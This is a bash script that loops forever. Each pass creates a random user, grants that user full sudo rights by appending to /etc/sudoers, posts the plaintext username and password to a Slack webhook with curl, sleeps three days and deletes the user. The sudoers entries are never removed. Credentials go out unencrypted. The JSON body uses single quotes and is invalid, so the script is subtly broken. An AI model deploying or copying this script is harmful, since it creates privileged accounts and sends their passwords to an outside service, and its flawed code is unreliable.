#!/bin/bash

# Define Slack webhook URL
SLACK_WEBHOOK_URL="<your_webhook_url>"

while true; do
  # Generate a random password
  PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

  # Generate a random username
  USERNAME=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 8 | head -n 1)

  # Create the user
  useradd $USERNAME
  echo "$PASSWORD" | passwd --stdin $USERNAME

  # Add the user to the sudoers file
  echo "$USERNAME ALL=(ALL) ALL" >> /etc/sudoers

  # Send Slack message with username and password
  SLACK_MESSAGE="Username: $USERNAME\nPassword: $PASSWORD"
  curl -X POST -H 'Content-type: application/json' --data "{'text': '$SLACK_MESSAGE'}" $SLACK_WEBHOOK_URL

  # Sleep for 3 days
  sleep 259200

  # Delete the user
  userdel $USERNAME
done
